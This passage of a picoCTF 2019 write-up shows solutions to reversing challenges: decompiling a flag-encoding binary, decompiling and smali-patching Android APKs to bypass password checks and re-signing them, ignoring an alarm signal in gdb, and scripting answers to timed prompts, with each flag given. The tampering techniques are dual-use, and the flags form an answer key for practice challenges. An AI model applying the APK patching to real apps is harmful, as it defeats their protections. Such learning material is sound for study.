│       │   0x000011c9      e862feffff     call sym.imp.puts           ; int puts(const char *s)
│       │   ; CODE XREF from main @ 0x11c0
│       └─&gt; 0x000011ce      48837de000     cmp qword [var_20h], 0
│       ┌─&lt; 0x000011d3      750c           jne 0x11e1
│       │   0x000011d5      488d3d7e0e00.  lea rdi, str.please_run_this_on_the_server ; 0x205a ; &quot;please run this on the server&quot; ; const char *s
│       │   0x000011dc      e84ffeffff     call sym.imp.puts           ; int puts(const char *s)
│       │   ; CODE XREF from main @ 0x11d3
│       └─&gt; 0x000011e1      488b55e8       mov rdx, qword [stream]
│           0x000011e5      488d45b0       lea rax, [ptr]
│           0x000011e9      4889d1         mov rcx, rdx                ; FILE *stream
│           0x000011ec      ba01000000     mov edx, 1                  ; size_t nmemb
│           0x000011f1      be18000000     mov esi, 0x18               ; size_t size
│           0x000011f6      4889c7         mov rdi, rax                ; void *ptr
│           0x000011f9      e842feffff     call sym.imp.fread          ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
│           0x000011fe      8945dc         mov dword [var_24h], eax
│           0x00001201      837ddc00       cmp dword [var_24h], 0
│       ┌─&lt; 0x00001205      7f0a           jg 0x1211
│       │   0x00001207      bf00000000     mov edi, 0                  ; int status
│       │   0x0000120c      e86ffeffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from main @ 0x1205
│       └─&gt; 0x00001211      c745f8000000.  mov dword [var_8h], 0
│       ┌─&lt; 0x00001218      eb23           jmp 0x123d
│       │   ; CODE XREF from main @ 0x1241
│      ┌──&gt; 0x0000121a      8b45f8         mov eax, dword [var_8h]
│      ╎│   0x0000121d      4898           cdqe
│      ╎│   0x0000121f      0fb64405b0     movzx eax, byte [rbp + rax - 0x50]
│      ╎│   0x00001224      8845ff         mov byte [c], al
│      ╎│   0x00001227      0fbe45ff       movsx eax, byte [c]
│      ╎│   0x0000122b      488b55e0       mov rdx, qword [var_20h]
│      ╎│   0x0000122f      4889d6         mov rsi, rdx                ; FILE *stream
│      ╎│   0x00001232      89c7           mov edi, eax                ; int c
│      ╎│   0x00001234      e827feffff     call sym.imp.fputc          ; int fputc(int c, FILE *stream)
│      ╎│   0x00001239      8345f801       add dword [var_8h], 1
│      ╎│   ; CODE XREF from main @ 0x1218
│      ╎└─&gt; 0x0000123d      837df807       cmp dword [var_8h], 7
│      └──&lt; 0x00001241      7ed7           jle 0x121a
│           0x00001243      c745f4080000.  mov dword [var_ch], 8
│       ┌─&lt; 0x0000124a      eb43           jmp 0x128f
│       │   ; CODE XREF from main @ 0x1293
│      ┌──&gt; 0x0000124c      8b45f4         mov eax, dword [var_ch]
│      ╎│   0x0000124f      4898           cdqe
│      ╎│   0x00001251      0fb64405b0     movzx eax, byte [rbp + rax - 0x50]
│      ╎│   0x00001256      8845ff         mov byte [c], al
│      ╎│   0x00001259      8b45f4         mov eax, dword [var_ch]
│      ╎│   0x0000125c      83e001         and eax, 1
│      ╎│   0x0000125f      85c0           test eax, eax
│     ┌───&lt; 0x00001261      750c           jne 0x126f
│     │╎│   0x00001263      0fb645ff       movzx eax, byte [c]
│     │╎│   0x00001267      83c005         add eax, 5
│     │╎│   0x0000126a      8845ff         mov byte [c], al
│    ┌────&lt; 0x0000126d      eb0a           jmp 0x1279
│    ││╎│   ; CODE XREF from main @ 0x1261
│    │└───&gt; 0x0000126f      0fb645ff       movzx eax, byte [c]
│    │ ╎│   0x00001273      83e802         sub eax, 2
│    │ ╎│   0x00001276      8845ff         mov byte [c], al
│    │ ╎│   ; CODE XREF from main @ 0x126d
│    └────&gt; 0x00001279      0fbe45ff       movsx eax, byte [c]
│      ╎│   0x0000127d      488b55e0       mov rdx, qword [var_20h]
│      ╎│   0x00001281      4889d6         mov rsi, rdx                ; FILE *stream
│      ╎│   0x00001284      89c7           mov edi, eax                ; int c
│      ╎│   0x00001286      e8d5fdffff     call sym.imp.fputc          ; int fputc(int c, FILE *stream)
│      ╎│   0x0000128b      8345f401       add dword [var_ch], 1
│      ╎│   ; CODE XREF from main @ 0x124a
│      ╎└─&gt; 0x0000128f      837df416       cmp dword [var_ch], 0x16
│      └──&lt; 0x00001293      7eb7           jle 0x124c
│           0x00001295      0fb645c7       movzx eax, byte [var_39h]
│           0x00001299      8845ff         mov byte [c], al
│           0x0000129c      0fbe45ff       movsx eax, byte [c]
│           0x000012a0      488b55e0       mov rdx, qword [var_20h]
│           0x000012a4      4889d6         mov rsi, rdx                ; FILE *stream
│           0x000012a7      89c7           mov edi, eax                ; int c
│           0x000012a9      e8b2fdffff     call sym.imp.fputc          ; int fputc(int c, FILE *stream)
│           0x000012ae      488b45e0       mov rax, qword [var_20h]
│           0x000012b2      4889c7         mov rdi, rax                ; FILE *stream
│           0x000012b5      e896fdffff     call sym.imp.fclose         ; int fclose(FILE *stream)
│           0x000012ba      488b45e8       mov rax, qword [stream]
│           0x000012be      4889c7         mov rdi, rax                ; FILE *stream
│           0x000012c1      e88afdffff     call sym.imp.fclose         ; int fclose(FILE *stream)
│           0x000012c6      90             nop
│           0x000012c7      c9             leave
└           0x000012c8      c3             ret
</code></pre>
<p>Therefor we need to fire up <a href="https://ghidra-sre.org/">ghidra</a></p>
<pre><code class="language-c">/* DISPLAY WARNING: Type casts are NOT being printed */

void main(void)

{
  size_t sVar1;
  char local_58 [23];
  char local_41;
  int local_2c;
  FILE *local_28;
  FILE *local_20;
  uint local_14;
  int local_10;
  char local_9;
  
  local_20 = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  local_28 = fopen(&quot;rev_this&quot;,&quot;a&quot;);
  if (local_20 == NULL) {
    puts(&quot;No flag found, please make sure this is run on the server&quot;);
  }
  if (local_28 == NULL) {
    puts(&quot;please run this on the server&quot;);
  }
  sVar1 = fread(local_58,24,1,local_20);
  local_2c = sVar1;
  if (sVar1 &lt; 1) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  local_10 = 0;
  while (local_10 &lt; 8) {
    local_9 = local_58[local_10];
    fputc(local_9,local_28);
    local_10 = local_10 + 1;
  }
  local_14 = 8;
  while (local_14 &lt; 23) {
    if ((local_14 &amp; 1) == 0) {
      local_9 = local_58[local_14] + '\x05';
    }
    else {
      local_9 = local_58[local_14] + -2;
    }
    fputc(local_9,local_28);
    local_14 = local_14 + 1;
  }
  local_9 = local_41;
  fputc(local_41,local_28);
  fclose(local_28);
  fclose(local_20);
  return;
}
</code></pre>
<p>After some renaming we get</p>
<pre><code class="language-c">void main(void)

{
  size_t result;
  char buf [23];
  char local_41;
  int local_2c;
  FILE *output;
  FILE *flag_file;
  uint j;
  int i;
  char chr;
  
  flag_file = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  output = fopen(&quot;rev_this&quot;,&quot;a&quot;);
  if (flag_file == NULL) {
    puts(&quot;No flag found, please make sure this is run on the server&quot;);
  }
  if (output == NULL) {
    puts(&quot;please run this on the server&quot;);
  }
  result = fread(buf,24,1,flag_file);
  local_2c = result;
  if (result &lt; 1) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  i = 0;
  while (i &lt; 8) {
    chr = buf[i];
    fputc(chr,output);
    i = i + 1;
  }
  j = 8;
  while (j &lt; 23) {
    if ((j &amp; 1) == 0) {
      chr = buf[j] + '\x05';
    }
    else {
      chr = buf[j] + -2;
    }
    fputc(chr,output);
    j = j + 1;
  }
  chr = local_41;
  fputc(local_41,output);
  fclose(output);
  fclose(flag_file);
  return;
}
</code></pre>
<p>The important bit is here</p>
<pre><code class="language-c">  i = 0;
  while (i &lt; 8) {
    chr = buf[i];
    fputc(chr,output);
    i = i + 1;
  }
  j = 8;
  while (j &lt; 23) {
    if ((j &amp; 1) == 0) {
      chr = buf[j] + '\x05';
    }
    else {
      chr = buf[j] + -2;
    }
    fputc(chr,output);
    j = j + 1;
  }
</code></pre>
<p>Slaping together some python.</p>
<pre><code class="language-python">inp = &quot;picoCTF{w1{1wq83k055j5f}&quot;
out = []

for i in range(8):
    out.append(inp[i])

for j in range(8, 23):
    if (j &amp; 1) == 0:
        out.append(chr(ord(inp[j])-0x5))
    else:
        out.append(chr(ord(inp[j])+2))

print(''.join(out))
</code></pre>
<p>This gives <code>picoCTF{r3v3rs35f207e7a</code>. We can guess that we need a <code>}</code> to close
it. That is probaly what <code>local_41</code> was.</p>
<p>Trying <code>picoCTF{r3v3rs35f207e7a}</code>, it is right.</p>
<p>Flag: <code>picoCTF{r3v3rs35f207e7a}</code></p>
<h1><a class="header" href="#droids0" id="droids0">droids0</a></h1>
<p><img src="reversing/13-droids0/./imgs/0toolbox.png" alt="" />
First you need to install <a href="https://developer.android.com/studio">android studio</a>. I find the best way is to use <a href="https://www.jetbrains.com/toolbox-app/">jetbrains toolbox</a>.</p>
<p>Then open the apk.</p>
<p><img src="reversing/13-droids0/./imgs/1open.png" alt="" /></p>
<p>You'll need to finagle android studio into having a virual device, but their are other better guides to do that. Once you have, press the green arrow in the top right</p>
<p><img src="reversing/13-droids0/./imgs/23_run.png" alt="" /></p>
<p>Then press the button in the app</p>
<p><img src="reversing/13-droids0/./imgs/24_button.png" alt="" /></p>
<p>And the flag is printed to the run section</p>
<p><img src="reversing/13-droids0/./imgs/25_flag.png" alt="" /></p>
<p>Flag: <code>picoCTF{a.moose.once.bit.my.sister}</code></p>
<h1><a class="header" href="#droids1" id="droids1">droids1</a></h1>
<p>We will use <a href="https://github.com/skylot/jadx">jadx</a> to decompile the apk</p>
<pre><code>jadx one.apk -d one
</code></pre>
<p>In <code>one/sources/com/hellocmu/picoctf/MainActivity.java</code> we see</p>
<pre><code class="language-java">    public void buttonClick(View view) {
        this.text_bottom.setText(
            FlagstaffHill.getFlag(
                this.text_input.getText().toString(),
                this.ctx));
    }
</code></pre>
<p>Finding the <code>FlagstaffHill</code> class we see:</p>
<pre><code class="language-java">    public static String getFlag(String input, Context ctx) {
        if (input.equals(ctx.getString(R.string.password))) {
            return fenugreek(input);
        }
        return &quot;NOPE&quot;;
    }
</code></pre>
<p><code>fenugreek</code> is a jni call that (presumably) produces the flag.</p>
<p>The password is comewhere in the context, and if we do <code>rg password one</code>, we get</p>
<pre><code>one/sources/com/hellocmu/picoctf/FlagstaffHill.java
9:        if (input.equals(ctx.getString(R.string.password))) {

one/sources/com/hellocmu/picoctf/R.java
928:        public static final int password = 2131427375;

one/resources/res/values/strings.xml
50:    &lt;string name=&quot;password&quot;&gt;opossum&lt;/string&gt;

one/resources/res/values/public.xml
893:    &lt;public type=&quot;string&quot; name=&quot;password&quot; id=&quot;2131427375&quot; /&gt;
</code></pre>
<p>It looks like the password is <code>opossum</code></p>
<p><img src="reversing/14-droids1/./img.png" alt="" /></p>
<p>Entering that in, we get the flag.</p>
<p>Flag: <code>picoCTF{pining.for.the.fjords}</code></p>
<h1><a class="header" href="#droids2" id="droids2">droids2</a></h1>
<pre><code>jadx two.apk -d two
</code></pre>
<p>Looking at <code>FlagstaffHill</code></p>
<pre><code class="language-java">    public static String getFlag(String input, Context ctx) {
        String[] witches = {&quot;weatherwax&quot;, &quot;ogg&quot;, &quot;garlick&quot;, &quot;nitt&quot;, &quot;aching&quot;, &quot;dismass&quot;};
        int second = 3 - 3;
        int third = (3 / 3) + second;
        int fourth = (third + third) - second;
        int fifth = 3 + fourth;
        if (input.equals(&quot;&quot;.concat(witches[fifth]).concat(&quot;.&quot;).concat(witches[third]).concat(&quot;.&quot;).concat(witches[second]).concat(&quot;.&quot;).concat(witches[(fifth + second) - third]).concat(&quot;.&quot;).concat(witches[3]).concat(&quot;.&quot;).concat(witches[fourth]))) {
            return sesame(input);
        }
        return &quot;NOPE&quot;;
    }
</code></pre>
<p>We can hoist most of this code to solve it.</p>
<pre><code class="language-java">class solve {
    public static void main(String[] args) {
        String[] witches = {&quot;weatherwax&quot;, &quot;ogg&quot;, &quot;garlick&quot;, &quot;nitt&quot;, &quot;aching&quot;, &quot;dismass&quot;};
        int second = 3 - 3;
        int third = (3 / 3) + second;
        int fourth = (third + third) - second;
        int fifth = 3 + fourth;
        String sol = &quot;&quot;.concat(witches[fifth]).concat(&quot;.&quot;).concat(witches[third]).concat(&quot;.&quot;).concat(witches[second]).concat(&quot;.&quot;).concat(witches[(fifth + second) - third]).concat(&quot;.&quot;).concat(witches[3]).concat(&quot;.&quot;).concat(witches[fourth]);
        System.out.println(sol);
    }
}
</code></pre>
<p>Running gives up <code>dismass.ogg.weatherwax.aching.nitt.garlick</code>.</p>
<p>Entering that gives <code>picoCTF{what.is.your.favourite.colour}</code></p>
<h1><a class="header" href="#droids3" id="droids3">droids3</a></h1>
<p>Again decompile with <code>jadx three.apk -d three</code></p>
<p>Looking at <code>FlagstaffHill</code></p>
<pre><code class="language-java">package com.hellocmu.picoctf;

import android.content.Context;

public class FlagstaffHill {
    public static native String cilantro(String str);

    public static String nope(String input) {
        return &quot;don't wanna&quot;;
    }

    public static String yep(String input) {
        return cilantro(input);
    }

    public static String getFlag(String input, Context ctx) {
        return nope(input);
    }
}
</code></pre>
<p>We will use apktool to change the <code>nope</code> call to <code>yep</code></p>
<pre><code>apktool d three.apk 
</code></pre>
<p>Then in <code>three/smali/com/hellocmu/picoctf/FlagstaffHill.smali</code>, we can see the smali version of the method.</p>
<pre><code class="language-smali">.method public static getFlag(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 1
    .param p0, &quot;input&quot;    # Ljava/lang/String;
    .param p1, &quot;ctx&quot;    # Landroid/content/Context;

    .line 19
    invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-&gt;nope(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 20
    .local v0, &quot;flag&quot;:Ljava/lang/String;
    return-object v0
.end method
</code></pre>
<p>We can change the <code>invoke-static</code> to call <code>yep</code></p>
<pre><code class="language-smali">    invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-&gt;yep(Ljava/lang/String;)Ljava/lang/String;
</code></pre>
<p>Then we build this change into a new apk</p>
<pre><code>apktool b three -o three_run.apk
</code></pre>
<p>As we've modified it, we need to <a href="https://stackoverflow.com/questions/10930331/how-to-sign-an-already-compiled-apk">sign it</a></p>
<pre><code>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore three_run.apk alias_name
</code></pre>
<p>Running the new APK, we get the flag</p>
<p>Flag: <code>picoCTF{tis.but.a.scratch}</code></p>
<h1><a class="header" href="#droids4" id="droids4">droids4</a></h1>
<pre><code>jadx four.apk -d four
</code></pre>
<p>Again looking at <code>FlagstaffHill</code></p>
<pre><code class="language-java">package com.hellocmu.picoctf;
import android.content.Context;

public class FlagstaffHill {
    public static native String cardamom(String str);

    public static String getFlag(String input, Context ctx) {
        StringBuilder ace = new StringBuilder(&quot;aaa&quot;);
        StringBuilder jack = new StringBuilder(&quot;aaa&quot;);
        StringBuilder queen = new StringBuilder(&quot;aaa&quot;);
        StringBuilder king = new StringBuilder(&quot;aaa&quot;);
        ace.setCharAt(0, (char) (ace.charAt(0) + 4));
        ace.setCharAt(1, (char) (ace.charAt(1) + 19));
        ace.setCharAt(2, (char) (ace.charAt(2) + 18));
        jack.setCharAt(0, (char) (jack.charAt(0) + 7));
        jack.setCharAt(1, (char) (jack.charAt(1) + 0));
        jack.setCharAt(2, (char) (jack.charAt(2) + 1));
        queen.setCharAt(0, (char) (queen.charAt(0) + 0));
        queen.setCharAt(1, (char) (queen.charAt(1) + 11));
        queen.setCharAt(2, (char) (queen.charAt(2) + 15));
        king.setCharAt(0, (char) (king.charAt(0) + 14));
        king.setCharAt(1, (char) (king.charAt(1) + 20));
        king.setCharAt(2, (char) (king.charAt(2) + 15));
        if (input.equals(&quot;&quot;.concat(queen.toString()).concat(jack.toString()).concat(ace.toString()).concat(king.toString()))) {
            return &quot;call it&quot;;
        }
        return &quot;NOPE&quot;;
    }
}
</code></pre>
<p>What we want this to be is</p>
<pre><code class="language-java">package com.hellocmu.picoctf;
import android.content.Context;

public class FlagstaffHill {
    public static native String cardamom(String str);

    public static String getFlag(String input, Context ctx) {
        StringBuilder ace = new StringBuilder(&quot;aaa&quot;);
        StringBuilder jack = new StringBuilder(&quot;aaa&quot;);
        StringBuilder queen = new StringBuilder(&quot;aaa&quot;);
        StringBuilder king = new StringBuilder(&quot;aaa&quot;);
        ace.setCharAt(0, (char) (ace.charAt(0) + 4));
        ace.setCharAt(1, (char) (ace.charAt(1) + 19));
        ace.setCharAt(2, (char) (ace.charAt(2) + 18));
        jack.setCharAt(0, (char) (jack.charAt(0) + 7));
        jack.setCharAt(1, (char) (jack.charAt(1) + 0));
        jack.setCharAt(2, (char) (jack.charAt(2) + 1));
        queen.setCharAt(0, (char) (queen.charAt(0) + 0));
        queen.setCharAt(1, (char) (queen.charAt(1) + 11));
        queen.setCharAt(2, (char) (queen.charAt(2) + 15));
        king.setCharAt(0, (char) (king.charAt(0) + 14));
        king.setCharAt(1, (char) (king.charAt(1) + 20));
        king.setCharAt(2, (char) (king.charAt(2) + 15));
        return cardamom(&quot;&quot;.concat(queen.toString()).concat(jack.toString()).concat(ace.toString()).concat(king.toString()))
    }
}
</code></pre>
<p>However, it's much easyer to edit the smali, than java, so we want to convert this 
<a href="https://stackoverflow.com/questions/29051781/convert-java-file-to-smali-file">to java</a></p>
<p>First we need some minor modification, so it can be compiled outside of android.</p>
<pre><code class="language-java">public class FlagstaffHill {
    private class Context{}

    public static native String cardamom(String str);

    public static String getFlag(String input, Context ctx) {
        StringBuilder ace = new StringBuilder(&quot;aaa&quot;);
        StringBuilder jack = new StringBuilder(&quot;aaa&quot;);
        StringBuilder queen = new StringBuilder(&quot;aaa&quot;);
        StringBuilder king = new StringBuilder(&quot;aaa&quot;);
        ace.setCharAt(0, (char) (ace.charAt(0) + 4));
        ace.setCharAt(1, (char) (ace.charAt(1) + 19));
        ace.setCharAt(2, (char) (ace.charAt(2) + 18));
        jack.setCharAt(0, (char) (jack.charAt(0) + 7));
        jack.setCharAt(1, (char) (jack.charAt(1) + 0));
        jack.setCharAt(2, (char) (jack.charAt(2) + 1));
        queen.setCharAt(0, (char) (queen.charAt(0) + 0));
        queen.setCharAt(1, (char) (queen.charAt(1) + 11));
        queen.setCharAt(2, (char) (queen.charAt(2) + 15));
        king.setCharAt(0, (char) (king.charAt(0) + 14));
        king.setCharAt(1, (char) (king.charAt(1) + 20));
        king.setCharAt(2, (char) (king.charAt(2) + 15));
        return cardamom(&quot;&quot;.concat(queen.toString()).concat(jack.toString()).concat(ace.toString()).concat(king.toString()));
    }
}
</code></pre>
<pre><code>/Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home/bin/javac FlagstaffHill.java
~/Library/Android/sdk/build-tools/30.0.0/dx --dex --output=d.dex FlagstaffHill.class
baksmali d d.dex 
</code></pre>
<p>Finaly we have the smali we need. Next we disaseble the apk.</p>
<pre><code>apktool d four.apk
</code></pre>
<p>The go into <code>FlagstaffHill.smali</code>. And the end it looks like this (wo anotations)</p>
<pre><code class="language-smali"># Finish generating the password
invoke-virtual {v4, v5}, Ljava/lang/String;-&gt;concat(Ljava/lang/String;)Ljava/lang/String;

    # Put it in v4
    move-result-object v4

    .line 36
    .local v4, &quot;password&quot;:Ljava/lang/String;
    # Compare the input (p0, to the password)
    invoke-virtual {p0, v4}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z

    # Store in v5
    move-result v5

    # If not equal, goto :cond_0
    if-eqz v5, :cond_0

    # Create tht string &quot;call it&quot;
    const-string v5, &quot;call it&quot;

    # Return that string
    return-object v5

    # If passowrd was wrong, crate and return &quot;NOPE&quot;
    .line 37
    :cond_0
    const-string v5, &quot;NOPE&quot;

    return-object v5
.end method
</code></pre>
<p>The replace ment is this</p>
<pre><code class="language-smali">
    # Finish password generation
    invoke-virtual {v4, v5}, Ljava/lang/String;-&gt;concat(Ljava/lang/String;)Ljava/lang/String;

    # Store passord in v5
    move-result-object v4

    # Call cardamom with password
    invoke-static {v4}, Lcom/hellocmu/picoctf/FlagstaffHill;-&gt;cardamom(Ljava/lang/String;)Ljava/lang/String;

    # Store in v5
    move-result-object v5

    # Return v5
    return-object v5

.end method
</code></pre>
<p>Finaly rebuild the apk, and sign with the key</p>
<pre><code>apktool b four -o four_run.apk
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore four_run.apk alias_name 
</code></pre>
<p>Running gives the flag.</p>
<p>Flag: <code>picoCTF{not.particularly.silly}</code></p>
<h1><a class="header" href="#need-for-speed" id="need-for-speed">Need For Speed</a></h1>
<p>Again we use ghidra</p>
<pre><code class="language-c">undefined8 main(void)

{
  header();
  set_timer();
  get_key();
  print_flag();
  return 0;
}
</code></pre>
<p>Here we call <a href="https://man7.org/linux/man-pages/man2/alarm.2.html"><code>alarm</code></a>, so we have 1 sec untill we get the signal</p>
<p>However, we can actualy <a href="https://stackoverflow.com/questions/26145952/gdb-sigalrm-alarm-clock-termination">ignore <code>SIGALRM</code></a>, like this </p>
<pre><code>$ gdb need-for-speed -quiet
Reading symbols from need-for-speed...
(No debugging symbols found in need-for-speed)
(gdb)  handle SIGALRM ignore
Signal        Stop	Print	Pass to program	Description
SIGALRM       No	No	No		Alarm clock
(gdb) run
Starting program: /tmp/need-for-speed
Missing separate debuginfos, use: dnf debuginfo-install glibc-2.31-2.fc32.x86_64
Keep this thing over 50 mph!
============================

Creating key...
Finished
Printing flag:
PICOCTF{Good job keeping bus #236cb1c9 speeding along!}
[Inferior 1 (process 63289) exited normally]
(gdb) quit
</code></pre>
<h1><a class="header" href="#times-up" id="times-up">Time's Up</a></h1>
<p>We need to go quickly.</p>
<pre><code class="language-python">from pwn import *

DIR=&quot;/problems/time-s-up_6_480d53541469436212e30dad5b4ce691&quot;
#DIR = &quot;.&quot;
p = process(DIR + &quot;/times-up&quot;)

rawin = p.recv()
math = rawin[len(&quot;Challenge: &quot;) : rawin.index(b&quot;\n&quot;)]
p.sendline(str(eval(math)))

p.recv()
print(p.recv())
</code></pre>
<p>This will get the question, solve it, and print the flag. It needs to be executed on the server, as it is time sensitive,</p>
<p>Place the code in the home dir, but it needs to be run from the problem dir, or the executable cant find the flag</p>
<pre><code>yeswriteup@pico-2019-shell1:~$ cd /problems/time-s-up_6_480d53541469436212e30dad5b4ce691
yeswriteup@pico-2019-shell1:/problems/time-s-up_6_480d53541469436212e30dad5b4ce691$ python ~/solve.py
[+] Starting local process '/problems/time-s-up_6_480d53541469436212e30dad5b4ce691/times-up': pid 2341595
picoCTF{Gotta go fast. Gotta go FAST. #1626a7fb}

[*] Process '/problems/time-s-up_6_480d53541469436212e30dad5b4ce691/times-up' stopped with exit code 0 (pid 2341595)
yeswriteup@pico-2019-shell1:/problems/time-s-up_6_480d53541469436212e30dad5b4ce691$
</code></pre>
<p>Flag: <code>picoCTF{Gotta go fast. Gotta go FAST. #1626a7fb}</code></p>
<h1><a class="header" href="#times-up-again" id="times-up-again">Time's Up, Again!</a></h1>
<p>First we need to implement a fast calulator. This need to be fast as hell, so
you're options are c, c++, rust. I chose rust, as it has way nices methods of 
dealing with the process.</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Solver&lt;'a&gt; {
    pub prob: &amp;'a [u8],
}

impl&lt;'a&gt; Solver&lt;'a&gt; {
    fn new(prob: &amp;'a [u8]) -&gt; Self {
        Self { prob }
    }

    fn peek(&amp;self) -&gt; u8 {
        *self.prob.get(0).unwrap_or(&amp;0)
    }

    fn get(&amp;mut self) -&gt; u8 {
        let ret = self.peek();
        self.prob = &amp;self.prob[1..];
        ret
    }

    fn number(&amp;mut self) -&gt; i64 {
        let mut ret: i64 = (self.get() - b'0') as i64;
        while self.peek() &gt;= b'0' &amp;&amp; self.peek() &lt;= b'9' {
            ret = 10 * ret + (self.get() - b'0') as i64;
        }
        ret
    }

    fn factor(&amp;mut self) -&gt; i64 {
        if self.peek() &gt;= b'0' &amp;&amp; self.peek() &lt;= b'9' {
            self.number()
        } else if self.peek() == b'(' {
            self.get();
            let ret = self.expr();
            self.get();
            ret
        } else if self.peek() == b'-' {
            self.get();
            return -self.factor();
        } else {
            unreachable!(
                &quot;{},{}&quot;,
                self.peek() as char,
                std::str::from_utf8(self.prob).unwrap()
            )
        }
    }

    fn term(&amp;mut self) -&gt; i64 {
        let mut res = self.factor();
        while self.peek() == b'*' || self.peek() == b'/' {
            if self.get() == b'*' {
                res *= self.factor()
            } else {
                res /= self.factor()
            }
        }
        res
    }

    fn expr(&amp;mut self) -&gt; i64 {
        let mut res = self.term();
        while self.peek() == b'+' || self.peek() == b'-' {
            if self.get() == b'+' {
                res += self.term()
            } else {
                res -= self.term()
            }
        }
        res
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>This uses <a href="https://stackoverflow.com/questions/9329406/evaluating-arithmetic-expressions-from-string-in-c">recursive decent</a>, and doesn't build up a tree, but evals right away, so it's fast.</p>
<p>Now we can get on with the ipc.</p>
<pre><pre class="playground"><code class="language-rust">const DIR: &amp;str = &quot;/problems/time-s-up--again-_6_3b092353ed59a3db99109f8c0f6f5cd0/&quot;;
const COMMAND: &amp;str =
    &quot;/problems/time-s-up--again-_6_3b092353ed59a3db99109f8c0f6f5cd0/times-up-again&quot;;

fn main() {
    let mut process = Command::new(COMMAND)
        .current_dir(DIR)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
</code></pre></pre>
<p>Then we pull the stdin and stdout. This is much nicer than dealing with libc</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>    let answer = process.stdin.as_mut().unwrap();
    let mut question = BufReader::new(process.stdout.as_mut().unwrap());
    let mut buff = String::new();
<span class="boring">}
</span></code></pre></pre>
<p>Then we read the question, remove the header and spacer, solver it, and create the responce</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>    question.read_line(&amp;mut buff).unwrap();
    let q = &amp;buff[&quot;Challenge: &quot;.len()..buff.len()];

    let q = q.replace(&quot; &quot;, &quot;&quot;);

    let mut solver = Solver::new(q.as_bytes());

    let mut ans = solver.expr().to_string();
    ans.push('\n');
<span class="boring">}
</span></code></pre></pre>
<p>Finaly we send the responce and record the flag</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>    answer.write(ans.as_bytes());

    question.read_line(&amp;mut buff).unwrap();

    question.read_line(&amp;mut buff).unwrap();
    println!(&quot;{}&quot;, buff);
}
<span class="boring">}
</span></code></pre></pre>
<p>They don't have rustc on the server, but the binary is static, so we can just copy it over</p>
<pre><code>cargo build --release
strip target/release/solve
scp target/release/solve yeswriteup@2019shell1.picoctf.com:~
</code></pre>
<p>Flag: <code>picoCTF{Hasten. Hurry. Ferrociously Speedy. #2edc7d0a}</code></p>
<h1><a class="header" href="#b1ll_gat35" id="b1ll_gat35">B1ll_Gat35</a></h1>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        

        

        

        
        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
